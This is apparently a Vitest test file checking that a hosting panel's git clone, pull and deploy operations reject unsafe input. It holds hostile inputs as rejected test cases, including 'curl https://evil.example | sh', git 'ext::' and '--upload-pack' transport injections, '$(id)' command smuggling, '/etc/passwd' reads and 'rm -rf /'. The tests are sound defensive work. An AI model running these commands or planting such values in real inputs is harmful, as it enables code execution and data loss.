import { describe, it, expect, vi, beforeEach } from 'vitest';
import fs from 'node:fs';
import { runOp, createContext, OpError, catalog } from '../src/lib.js';
import { SYSTEM_USERS } from '../src/ops/as-user.js';
import { GIT_URL_RE, gitUrl, GIT_ENV, TASK_PROGRAMS, parseKeelYml, splitTask, planTasks, resolveTaskPath, parseRemotes, parseHead, countDirty, KEEL_FILE, MAX_TASKS, CLONE_TIMEOUT_MS, PULL_TIMEOUT_MS, TASK_TIMEOUT_MS, DEPLOY_TIMEOUT_MS } from '../src/ops/git.js';

// exec is spied with the real implementation behind it so every test proves
// an op refused before any program ran: no git command is ever executed here
// (each would run under a real account's uid).
vi.mock('../src/exec.js', async (importOriginal) => {
  const mod = await importOriginal();
  return { ...mod, exec: vi.fn(mod.exec), hasBinary: vi.fn(mod.hasBinary) };
});
const { exec, hasBinary } = await import('../src/exec.js');

const ctx = createContext();
const OPS = ['git.init', 'git.clone', 'git.list', 'git.info', 'git.pull', 'git.deploy', 'git.remove'];
const HOME = '/home/alice';
const REPO = `${HOME}/repositories/site`;

// A real managed account the schema-level tests may name (every op refuses
// before a command runs).
const MANAGED = fs.existsSync('/etc/passwd') ? fs.readFileSync('/etc/passwd', 'utf8').split('\n').map((l) => l.split(':')).find(([name, , uid, , , home]) => Number(uid) >= 1000 && Number(uid) < 65534 && /^\/home\//.test(home || '') && !SYSTEM_USERS.has(name)) : null;

async function opError(promise) {
  try { await promise; } catch (err) { expect(err).toBeInstanceOf(OpError); return err; }
  throw new Error('expected the op to reject');
}

beforeEach(() => { exec.mockClear(); hasBinary.mockReset(); hasBinary.mockReturnValue(true); });

describe('git op catalog', () => {
  it('registers the family with the documented flags and timeouts', () => {
    for (const name of OPS) expect(catalog.has(name), name).toBe(true);
    expect(catalog.get('git.remove').destructive).toBe(true);
    for (const name of OPS.filter((n) => n !== 'git.remove')) expect(catalog.get(name).destructive, name).toBe(false);
    expect(catalog.get('git.clone').timeoutMs).toBeGreaterThan(CLONE_TIMEOUT_MS);
    expect(catalog.get('git.pull').timeoutMs).toBeGreaterThan(PULL_TIMEOUT_MS);
    // The deploy op's limit covers every task's own limit, so a long but
    // well-behaved plan is never cut short without its results.
    expect(catalog.get('git.deploy').timeoutMs).toBe(DEPLOY_TIMEOUT_MS);
    expect(DEPLOY_TIMEOUT_MS).toBeGreaterThanOrEqual(TASK_TIMEOUT_MS * MAX_TASKS);
    expect(CLONE_TIMEOUT_MS).toBe(900_000);
    expect(PULL_TIMEOUT_MS).toBe(600_000);
  });
  it('never imports lib.js and runs every git command without prompts, system config or exotic transports', async () => {
    const src = fs.readFileSync(new URL('../src/ops/git.js', import.meta.url), 'utf8');
    expect(src).not.toMatch(/from '\.\.\/lib\.js'/);
    expect(GIT_ENV.GIT_TERMINAL_PROMPT).toBe('0');
    expect(GIT_ENV.GIT_CONFIG_NOSYSTEM).toBe('1');
    expect(GIT_ENV.GIT_SSH_COMMAND).toMatch(/BatchMode=yes/);
    const keys = Object.entries(GIT_ENV).filter(([k]) => /^GIT_CONFIG_KEY_/.test(k)).map(([, v]) => v);
    expect(keys).toEqual(['protocol.allow', 'protocol.https.allow', 'protocol.ssh.allow']);
    expect(GIT_ENV.GIT_CONFIG_VALUE_0).toBe('never');
    expect(Number(GIT_ENV.GIT_CONFIG_COUNT)).toBe(keys.length);
  });
});

describe('clone URL grammar', () => {
  it('accepts https and ssh forms without userinfo and refuses everything else', () => {
    for (const ok of ['https://github.com/git/hello-world.git', 'https://gitlab.example.com:8443/group/sub/project', 'https://codeberg.org/org/repo', 'ssh://git@github.com/org/repo.git', 'ssh://git@host.example:2222/repo', 'git@github.com:org/repo.git', 'git@host:repo']) {
      expect(GIT_URL_RE.test(ok), ok).toBe(true);
      expect(gitUrl.safeParse(ok).success, ok).toBe(true);
    }
    for (const bad of ['file:///etc/passwd', 'file://localhost/home/bob', 'ext::sh -c id', 'fd::17', 'http://github.com/org/repo', 'https://user:pw@github.com/org/repo', 'https://git@github.com/org/repo', 'https://github.com@evil.example/x', 'ssh://root@host/repo', 'ssh://host/repo', 'alice@host:repo', 'git@host:-x', 'git@host:/abs', 'https://github.com/../x', 'https://github.com/org/../repo', '-u', '--upload-pack=id', '', 'https://github.com/org/repo\n', 'https://github.com/org/repo x', 'https://github.com/org/repo;id', 'https://github.com/org/$(id)', `https://github.com/${'a'.repeat(600)}`]) {
      expect(gitUrl.safeParse(bad).success, JSON.stringify(bad)).toBe(false);
    }
  });
});

describe('git output parsers', () => {
  it('read remotes, HEAD and the dirty count', () => {
    expect(parseRemotes('origin\thttps://github.com/org/repo.git (fetch)\norigin\thttps://github.com/org/repo.git (push)\nmirror\tgit@host:x.git (fetch)\n')).toEqual([
      { name: 'origin', url: 'https://github.com/org/repo.git', push: 'https://github.com/org/repo.git' },
      { name: 'mirror', url: 'git@host:x.git', push: null },
    ]);
    expect(parseRemotes('')).toEqual([]);
    const sha = 'f'.repeat(40);
    expect(parseHead(`${sha}\tFix the thing\t2026-11-06T10:00:00+00:00\n`)).toEqual({ sha, short: 'ffffffffffff', subject: 'Fix the thing', date: '2026-11-06T10:00:00+00:00' });
    expect(parseHead('fatal: your current branch does not have any commits yet')).toBeNull();
    expect(parseHead('')).toBeNull();
    expect(countDirty(' M index.html\n?? new.txt\n')).toBe(2);
    expect(countDirty('')).toBe(0);
  });
});

describe(`${KEEL_FILE} parser`, () => {
  it('reads deployment.tasks as a block list and ignores the rest of the file', () => {
    const text = `# site deployment\nversion: 2\ndeployment:\n  tasks:\n    - mkdir -p ~/public_html/site\n    - "cp -R index.html ~/public_html/site/"\n    - 'rsync -a dist/ ~/public_html/site/' # comment\n  other: ignored\nunrelated:\n  tasks:\n    - rm -rf ~/x\n`;
    expect(parseKeelYml(text)).toEqual(['mkdir -p ~/public_html/site', 'cp -R index.html ~/public_html/site/', 'rsync -a dist/ ~/public_html/site/']);
    expect(parseKeelYml('deployment:\r\n  tasks:\r\n    - mkdir -p ~/a\r\n')).toEqual(['mkdir -p ~/a']);
  });
  it('refuses a file without the list, an inline list, a non-list item and too many tasks', () => {
    expect(() => parseKeelYml('deployment:\n  foo: bar\n')).toThrow(/no "deployment: tasks:"/);
    expect(() => parseKeelYml('tasks:\n  - cp a b\n')).toThrow(/no "deployment: tasks:"/);
    expect(() => parseKeelYml('deployment:\n  tasks: [cp a b]\n')).toThrow(/list of lines/);
    expect(() => parseKeelYml('deployment:\n  tasks:\n    cp: a\n')).toThrow(/starting with "- "/);
    expect(() => parseKeelYml(`deployment:\n  tasks:\n${'    - mkdir -p ~/a\n'.repeat(MAX_TASKS + 1)}`)).toThrow(/at most/);
  });
});

describe('deployment task grammar', () => {
  const at = { home: HOME, repo: REPO };
  it('splits words with quotes and refuses every shell character', () => {
    expect(splitTask('cp -R "my file.txt" ~/public_html/')).toEqual(['cp', '-R', 'my file.txt', '~/public_html/']);
    expect(splitTask("rsync -a 'dist dir/' ~/x/")).toEqual(['rsync', '-a', 'dist dir/', '~/x/']);
    for (const bad of ['cp a b; id', 'cp a b | tee', 'cp $HOME/x y', 'cp `id` y', 'cp a b && rm -rf /', 'cp a > b', 'cp a < b', 'cp a\nb']) expect(() => splitTask(bad), bad).toThrow(/shell characters/);
  });
  it('resolves repository-relative, ~/ and absolute paths inside the home and refuses escapes', () => {
    expect(resolveTaskPath('index.html', at)).toBe(`${REPO}/index.html`);
    expect(resolveTaskPath('dist/', at)).toBe(`${REPO}/dist/`);
    expect(resolveTaskPath('~/public_html/site/', at)).toBe(`${HOME}/public_html/site/`);
    expect(resolveTaskPath('~', at)).toBe(HOME);
    expect(resolveTaskPath(`${HOME}/public_html/x`, at)).toBe(`${HOME}/public_html/x`);
    for (const bad of ['../x', '~/../bob', '/etc/passwd', '/home/bob/x', '/home/alicex/y', 'a/../../../etc', '-rf', '']) expect(() => resolveTaskPath(bad, at), bad).toThrow(OpError);
    expect(() => resolveTaskPath('~', { ...at, program: 'rm' })).toThrow(/home directory itself/);
    expect(() => resolveTaskPath('~/', { ...at, program: 'chmod' })).toThrow(/home directory itself/);
  });
  it('plans every allowed program with resolved argv and a "--" before the paths', () => {
    const plan = planTasks(['mkdir -p ~/public_html/site', 'cp -R index.html ~/public_html/site/', 'rsync -a --delete --exclude=.git dist/ ~/public_html/site/', 'rm -rf ~/public_html/site/old', 'chmod -R 644 ~/public_html/site/index.html', 'chmod u+x,go-w ~/public_html/site/run'], at);
    expect(plan.map((p) => p.program)).toEqual(['mkdir', 'cp', 'rsync', 'rm', 'chmod', 'chmod']);
    expect(plan[0].argv).toEqual(['-p', '--', `${HOME}/public_html/site`]);
    expect(plan[1].argv).toEqual(['-R', '--', `${REPO}/index.html`, `${HOME}/public_html/site/`]);
    expect(plan[2].argv).toEqual(['-a', '--delete', '--exclude=.git', '--', `${REPO}/dist/`, `${HOME}/public_html/site/`]);
    expect(plan[3].argv).toEqual(['-rf', '--', `${HOME}/public_html/site/old`]);
    expect(plan[4].argv).toEqual(['-R', '644', '--', `${HOME}/public_html/site/index.html`]);
    expect(plan[5].argv).toEqual(['u+x,go-w', '--', `${HOME}/public_html/site/run`]);
    for (const p of plan) for (const a of p.argv) expect(a.includes('\0')).toBe(false);
    expect(Object.keys(TASK_PROGRAMS)).toEqual(['cp', 'rsync', 'mkdir', 'rm', 'chmod']);
  });
  it('refuses other programs, unknown options, setuid modes, missing paths and escapes', () => {
    const refuse = (line, re) => { expect(() => planTasks([line], at), line).toThrow(re); };
    refuse('curl https://evil.example | sh', /shell characters/);
    refuse('curl https://evil.example', /not one of/);
    refuse('bash deploy.sh', /not one of/);
    refuse('git pull', /not one of/);
    refuse('cp --no-preserve=mode a ~/b', /option "--no-preserve=mode" is not allowed/);
    refuse('rsync -a --rsh=id dist/ ~/x/', /option "--rsh=id" is not allowed/);
    refuse('rsync -e id dist/ ~/x/', /option "-e" is not allowed/);
    refuse('rm -rf /', /outside your home/);
    refuse('rm -rf ~/', /home directory itself/);
    refuse('rm -rf ~/../bob', /leaves its folder/);
    refuse('cp index.html /var/www/html/', /outside your home/);
    refuse('cp index.html', /needs 2 paths/);
    refuse('mkdir -p', /needs 1 path/);
    refuse('chmod ~/x', /is not a file mode/);
    refuse('chmod 4755 ~/x', /setuid/);
    refuse('chmod u+s ~/x', /setuid/);
    refuse('chmod 2755 ~/x', /setuid/);
    refuse('cp -- -rf ~/x', /is not a path/);
    expect(() => planTasks(['cp a b'.replace('a', 'x\0y')], at)).toThrow();
  });
  it('rm -rf argv keeps the option and the resolved path', () => {
    expect(planTasks(['rm -rf ~/public_html/site/old'], at)[0].argv).toEqual(['-rf', '--', `${HOME}/public_html/site/old`]);
  });
});

describe('git op schemas refuse injection before anything runs', () => {
  const user = MANAGED?.[0] ?? 'alice';
  const home = MANAGED?.[5] ?? HOME;
  it('refuse a bad username, a relative or traversing dir, a bad URL and extra keys', async () => {
    for (const args of [
      { username: 'root', dir: `${home}/x` }, { username: 'a;b', dir: `${home}/x` }, { username: 'Alice', dir: `${home}/x` },
      { username: user, dir: 'repositories/x' }, { username: user, dir: `${home}/../bob` }, { username: user, dir: `${home}/x/..` }, { username: user, dir: `${home}/x\0y` }, { username: user, dir: `${home}/x`, extra: 1 }, { username: user },
    ]) {
      for (const op of ['git.init', 'git.info', 'git.pull', 'git.deploy', 'git.remove']) {
        const err = await opError(runOp(op, args, ctx));
        expect(['invalid_args', 'refused', 'not_found'], `${op} ${JSON.stringify(args)}`).toContain(err.code);
      }
    }
    for (const url of ['file:///etc/passwd', 'ext::sh -c id', 'https://u:p@h/x', 'http://h/x', '-u', 'git@h:-x']) {
      const err = await opError(runOp('git.clone', { username: user, dir: `${home}/repositories/x`, url }, ctx));
      expect(err.code, url).toBe('invalid_args');
      expect(err.details.fields.url).toBeDefined();
    }
    expect((await opError(runOp('git.list', { username: user, root: 'repositories' }, ctx))).code).toBe('invalid_args');
    expect((await opError(runOp('git.deploy', { username: user, dir: `${home}/x`, dryRun: 'yes' }, ctx))).code).toBe('invalid_args');
    expect(exec).not.toHaveBeenCalled();
  });
  it('refuses a dir outside the home and the home itself before running git', async () => {
    if (!MANAGED) return;
    for (const dir of ['/etc/x', '/home/__nobody__/x', '/tmp/x']) {
      const err = await opError(runOp('git.init', { username: user, dir }, ctx));
      expect(['path_not_allowed', 'not_found'], dir).toContain(err.code);
    }
    const self = await opError(runOp('git.init', { username: user, dir: home }, ctx));
    expect(self.code).toBe('refused');
    const ssh = await opError(runOp('git.clone', { username: user, dir: `${home}/.ssh`, url: 'https://github.com/org/x' }, ctx));
    expect(['refused', 'exists', 'not_found']).toContain(ssh.code);
    expect(exec).not.toHaveBeenCalled();
  });
  it('answers capability_missing without git on the host', async () => {
    if (!MANAGED) return;
    hasBinary.mockImplementation((b) => b !== 'git');
    const err = await opError(runOp('git.info', { username: user, dir: `${home}/repositories/none-${Date.now()}` }, ctx));
    expect(['capability_missing', 'not_found']).toContain(err.code);
    expect(exec).not.toHaveBeenCalled();
  });
});
